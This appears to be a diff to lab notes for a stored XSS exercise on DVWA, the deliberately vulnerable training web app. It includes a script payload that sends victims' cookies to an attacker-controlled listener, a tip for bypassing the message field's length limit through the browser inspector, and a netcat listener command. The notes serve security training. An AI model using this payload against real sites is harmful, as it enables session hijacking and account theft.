@@ -7,6 +7,7 @@ Password: password
 Create/Reset database
 Left side bar: click on DVWA Security -> Low -> submit
 XSS (Stored) -> Name: test -> Message: <script>new Image().src="http://127.0.0.1:9000/?cookie="+document.cookie;</script>
+The message box has a limit of 50 characters, so it would not accept our full script. So, right click on the message box for Message, select Inspect. At the bottom, we will see <textarea name="mtxMessage" ...>. Here, remove the part maxLength="50" and then paste the full script again in the main text area. Now, we should be able to paste the full script.
 When a victim loads this guestbook page, their browser reads this hidden script, looks up their active authentication cookies via document.cookie, and attempts to load an invisible image from an IP address controlled by the attacker (Port 9000), passing the cookie right in the URL parameter
 
 Open a new terminal: nc -lvnp 9000
